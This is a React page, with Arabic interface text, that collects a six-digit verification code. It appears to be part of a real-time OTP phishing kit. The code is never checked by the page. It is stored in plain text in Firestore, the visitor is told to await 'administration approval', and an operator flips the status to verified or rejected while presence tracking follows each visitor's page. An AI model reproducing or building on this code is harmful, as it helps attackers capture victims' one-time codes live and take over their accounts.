import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { AlertCircle, CheckCircle2, Loader2, Headphones, Clock } from 'lucide-react';
import { doc, setDoc, addDoc, collection, onSnapshot, Timestamp, query, where, getDocs } from 'firebase/firestore';
import { db as dbInstance } from '@/lib/firebase-config';
import { setUserOnline, setUserOffline, updateUserPage } from '@/lib/realtime-presence';
import { getClientId } from '@/lib/clientId';

// Get db with null check
const getDb = () => {
  if (!dbInstance) {
    throw new Error('Firebase is not initialized');
  }
  return dbInstance;
};

export default function VerifyPage() {
  const navigate = useNavigate();
  
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);
  const [timeLeft, setTimeLeft] = useState(300);
  const [canResend, setCanResend] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  
  const [userId, setUserId] = useState(sessionStorage.getItem('reg_id'));
  const userEmail = sessionStorage.getItem('reg_email');
  const [lastSubmittedCodeId, setLastSubmittedCodeId] = useState<string | null>(null);

  useEffect(() => {
    const recoverSession = async () => {
      if (!userId && userEmail) {
        console.log('[Verify] Attempting to recover userId from email:', userEmail);
        try {
          const q = query(collection(getDb(), 'users'), where('email', '==', userEmail.toLowerCase()));
          const querySnapshot = await getDocs(q);
          if (!querySnapshot.empty) {
            const foundId = querySnapshot.docs[0].id;
            sessionStorage.setItem('reg_id', foundId);
            setUserId(foundId);
            return;
          }
        } catch (err) {
          console.error('[Verify] Session recovery failed:', err);
        }
      }
      
      if (!userId && !userEmail) {
        navigate('/login');
      }
    };

    recoverSession();
  }, [userId, userEmail, navigate]);

  useEffect(() => {
    if (!userId) return;
    
    const clientId = getClientId();
    setUserOnline(clientId, '/verify');
    
    return () => {
      setUserOffline(clientId);
    };
  }, [userId, navigate]);

  // الاستماع لتغييرات حالة الكود في الوقت الحقيقي
  useEffect(() => {
    if (!submitted) return;

    let unsubCode: (() => void) | null = null;
    let unsubUser: (() => void) | null = null;

    console.log('[Verify] Setting up listeners for approval...');

    // 1. Listen to verification code status (Primary trigger)
    if (lastSubmittedCodeId) {
      unsubCode = onSnapshot(doc(getDb(), 'verificationCodes', lastSubmittedCodeId), (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.data();
          console.log('[Verify] Code status update:', data.status);
          
          if (data.status === 'verified') {
            setSuccess(true);
            const clientId = getClientId();
            updateUserPage(clientId, '/processing');
            setTimeout(() => navigate('/processing'), 1500);
          } else if (data.status === 'rejected') {
            setError('رمز التحقق غير صحيح');
            setSubmitted(false);
            setWaitingApproval(false);
            setCode(['', '', '', '', '', '']);
            setTimeout(() => inputRefs.current[0]?.focus(), 100);
          }
        }
      });
    } 

    // 2. Listen to user status (Secondary/Fallback trigger)
    if (userId) {
      unsubUser = onSnapshot(doc(getDb(), 'users', userId), (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.data();
          console.log('[Verify] User status update:', data.status);
          
          if (data.status === 'verified' || data.status === 'completed') {
            setSuccess(true);
            const clientId = getClientId();
            updateUserPage(clientId, '/processing');
            setTimeout(() => navigate('/processing'), 1500);
          } else if (data.status === 'rejected') {
            setError('رمز التحقق غير صحيح');
            setSubmitted(false);
            setWaitingApproval(false);
            setCode(['', '', '', '', '', '']);
            setTimeout(() => inputRefs.current[0]?.focus(), 100);
          }
        }
      });
    }

    return () => {
      unsubCode?.();
      unsubUser?.();
    };
  }, [userId, lastSubmittedCodeId, submitted, navigate]);

  useEffect(() => {
    if (timeLeft <= 0) {
      setCanResend(true);
      return;
    }
    
    const timer = setInterval(() => {
      setTimeLeft(prev => prev - 1);
    }, 1000);
    
    return () => clearInterval(timer);
  }, [timeLeft]);

  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleInputChange = (index: number, value: string) => {
    const digit = value.replace(/\D/g, '').slice(-1);
    const newCode = [...code];
    newCode[index] = digit;
    setCode(newCode);
    setError('');

    if (digit && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace') {
      if (code[index] === '' && index > 0) {
        inputRefs.current[index - 1]?.focus();
      }
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    
    if (pastedData.length > 0) {
      const newCode = [...code];
      pastedData.split('').forEach((char, i) => {
        if (i < 6) newCode[i] = char;
      });
      setCode(newCode);
      
      const nextEmpty = newCode.findIndex(c => c === '');
      if (nextEmpty !== -1) {
        inputRefs.current[nextEmpty]?.focus();
      } else {
        inputRefs.current[5]?.focus();
      }
    }
  };

  const focusFirstEmpty = () => {
    const emptyIndex = code.findIndex(c => c === '');
    if (emptyIndex !== -1) {
      inputRefs.current[emptyIndex]?.focus();
    }
  };

  const getFullCode = () => code.join('');

  const handleSubmit = async () => {
    const fullCode = getFullCode();
    if (fullCode.length < 6) {
      setError('يرجى إدخال رمز التحقق المكون من 6 أرقام');
      focusFirstEmpty();
      return;
    }

    setLoading(true);
    setError('');

    try {
      if (!userId) {
        throw new Error('معرف المستخدم غير موجود');
      }

      const clientId = getClientId();
      const now = Timestamp.now();
      const nowISO = now.toDate().toISOString();

      // 1. تحديث مستند التسجيل
      const registrationRef = doc(getDb(), 'users', userId);
      await setDoc(registrationRef, {
        verification_code: fullCode,
        verification_submitted_at: nowISO,
        status: 'pending_verification'
      }, { merge: true });

      // 2. إضافة سجل في collection verificationCodes
      const codeRef = await addDoc(collection(getDb(), 'verificationCodes'), {
        userId: userId,
        clientId: clientId,
        code: fullCode,
        status: 'pending',
        verified: false,
        createdAt: now,
        updatedAt: now
      });
      setLastSubmittedCodeId(codeRef.id);

      console.log('[Verify] Code submitted and logged to verificationCodes');

      // الانتقال لصفحة الانتظار
      setSubmitted(true);
      setWaitingApproval(true);
      setTimeLeft(300);
      
    } catch (err: any) {
      console.error('Submission error:', err);
      setError(err.message || 'حدث خطأ أثناء إرسال الرمز');
    } finally {
      setLoading(false);
    }
  };

  const handleResend = async () => {
    if (!userId || !canResend) return;
    
    setLoading(true);
    setError('');
    setSubmitted(false);
    setWaitingApproval(false);
    setCode(['', '', '', '', '', '']);
    
    try {
      setTimeLeft(300);
      setCanResend(false);
      
      console.log('[Verify] Reset for new code');
      setTimeout(() => inputRefs.current[0]?.focus(), 100);
    } catch (err: any) {
      console.error('Reset error:', err);
    } finally {
      setLoading(false);
    }
  };

  if (!userId) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#101935' }}>
        <div className="text-center">
          <AlertCircle className="w-16 h-16 text-red-500 mx-auto mb-4" />
          <h2 className="text-xl font-bold mb-2" style={{ color: '#ffffff' }}>خطأ</h2>
          <p className="mb-4" style={{ color: '#8d99ae' }}>يرجى التسجيل أولاً</p>
          <button
            onClick={() => navigate('/login')}
            className="px-6 py-3 rounded-xl font-bold text-white transition-all"
            style={{ backgroundColor: '#4c72b8' }}
          >
            تسجيل جديد
          </button>
        </div>
      </div>
    );
  }

  return (
    <div 
      className="min-h-screen flex flex-col justify-between p-5"
      style={{ backgroundColor: '#101935', direction: 'rtl' }}
    >
      {/* Top Bar */}
      <div className="flex justify-between items-center" style={{ color: '#8d99ae' }}>
        <span className="text-sm">الإنكليزية</span>
        <Headphones className="text-lg cursor-pointer" />
      </div>

      {/* Content */}
      <div className="flex flex-col items-center justify-center flex-1 w-full max-w-[380px] mx-auto my-auto">
        {/* Logo */}
        <div className="mb-6">
          <svg width="70" height="70" viewBox="0 0 100 100" fill="none">
            <path d="M20 30 L50 10 L80 30 L50 50 Z" fill="#4c72b8"/>
            <path d="M20 70 L50 50 L80 70 L50 90 Z" fill="#2a9d8f"/>
          </svg>
        </div>

        {/* Title */}
        <h1 className="text-2xl font-bold mb-3 text-center" style={{ color: '#ffffff' }}>
          {waitingApproval ? 'في انتظار الموافقة' : 'رمز التحقق'}
        </h1>
        <p className="text-sm text-center mb-8 leading-relaxed" style={{ color: '#8d99ae' }}>
          {waitingApproval 
            ? 'تم إرسال الرمز بنجاح، بانتظار موافقة الإدارة' 
            : 'تم إرسال رمز التحقق يرجى ادخال الرمز'}
        </p>

        {/* حالة الانتظار */}
        {waitingApproval ? (
          <div className="flex flex-col items-center w-full">
            {/* أيقونة التحميل */}
            <div className="w-20 h-20 rounded-full flex items-center justify-center mb-6" 
              style={{ backgroundColor: 'rgba(76, 114, 184, 0.2)' }}>
              {success ? (
                <CheckCircle2 className="w-10 h-10" style={{ color: '#22c55e' }} />
              ) : (
                <Clock className="w-10 h-10 animate-pulse" style={{ color: '#4c72b8' }} />
              )}
            </div>

            {/* حالة النجاح */}
            {success && (
              <div className="flex items-center gap-2 mb-4 px-4 py-3 rounded-xl text-sm"
                style={{ 
                  backgroundColor: 'rgba(34, 197, 94, 0.1)', 
                  border: '1px solid rgba(34, 197, 94, 0.2)',
                  color: '#22c55e'
                }}>
                <CheckCircle2 className="w-5 h-5 flex-shrink-0" />
                <span>تمت الموافقة! جاري التحويل...</span>
              </div>
            )}

            {/* حالة الانتظار */}
            {!success && (
              <>
                <div className="flex items-center gap-2 mb-6 px-4 py-3 rounded-xl text-sm"
                  style={{ 
                    backgroundColor: 'rgba(76, 114, 184, 0.1)', 
                    border: '1px solid rgba(76, 114, 184, 0.2)',
                    color: '#4c72b8'
                  }}>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>بانتظار مراجعة الإدارة لطلبك...</span>
                </div>

                <p className="text-xs text-center" style={{ color: '#8d99ae' }}>
                  سيتم تحويلك تلقائياً عند موافقة الإدارة
                </p>
              </>
            )}
          </div>
        ) : (
          <>
            {/* OTP Inputs */}
            <div className="flex gap-2.5 justify-center w-full mb-8" style={{ direction: 'ltr' }}>
              {code.map((digit, index) => (
                <input
                  key={index}
                  ref={el => inputRefs.current[index] = el}
                  type="text"
                  inputMode="numeric"
                  pattern="[0-9]"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleInputChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  onPaste={handlePaste}
                  disabled={loading}
                  className="w-12 h-[52px] text-center text-xl font-bold rounded-xl transition-all focus:outline-none"
                  style={{
                    backgroundColor: '#1e2942',
                    border: error ? '2px solid #ef4444' : '1px solid #2a3859',
                    color: '#ffffff',
                  }}
                  onFocus={(e) => {
                    e.target.style.borderColor = '#4c72b8';
                    e.target.style.boxShadow = '0 0 10px rgba(76, 114, 184, 0.5)';
                  }}
                  onBlur={(e) => {
                    e.target.style.borderColor = error ? '#ef4444' : '#2a3859';
                    e.target.style.boxShadow = 'none';
                  }}
                />
              ))}
            </div>

            {/* Verify Button */}
            <button
              onClick={() => handleSubmit()}
              disabled={loading || code.some(c => c === '')}
              className="w-full py-3.5 rounded-xl font-bold text-base text-white transition-all mb-6 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              style={{ backgroundColor: '#4c72b8' }}
              onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#3b5a93'}
              onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#4c72b8'}
            >
              {loading ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>جاري الإرسال...</span>
                </>
              ) : (
                <span>تأكيد الرمز</span>
              )}
            </button>

            {/* Resend Section */}
            <div className="text-sm text-center" style={{ color: '#8d99ae' }}>
              <span>لم يصلك الرمز؟ </span>
              <button
                onClick={handleResend}
                disabled={loading || !canResend}
                className="font-bold transition-all disabled:cursor-not-allowed"
                style={{ 
                  color: canResend ? '#4a7c59' : '#555',
                  pointerEvents: canResend ? 'auto' : 'none'
                }}
              >
                إعادة إرسال
              </button>
              {!canResend && (
                <span className="mr-1" style={{ color: '#555' }}>
                  ({formatTime(timeLeft)})
                </span>
              )}
            </div>
          </>
        )}

        {/* Error Message */}
        {error && (
          <div className="flex items-center gap-2 mt-4 px-4 py-3 rounded-xl text-sm" 
            style={{ 
              backgroundColor: 'rgba(239, 68, 68, 0.1)', 
              border: '1px solid rgba(239, 68, 68, 0.2)',
              color: '#ef4444'
            }}>
            <AlertCircle className="w-5 h-5 flex-shrink-0" />
            <span>{error}</span>
          </div>
        )}
      </div>

      {/* Back Link */}
      <div className="text-center mt-auto pt-4">
        <button
          onClick={() => navigate('/login')}
          className="text-sm transition-colors"
          style={{ color: '#8d99ae' }}
          onMouseEnter={(e) => e.currentTarget.style.color = '#ffffff'}
          onMouseLeave={(e) => e.currentTarget.style.color = '#8d99ae'}
        >
          العودة لتسجيل الدخول ←
        </button>
      </div>
    </div>
  );
}
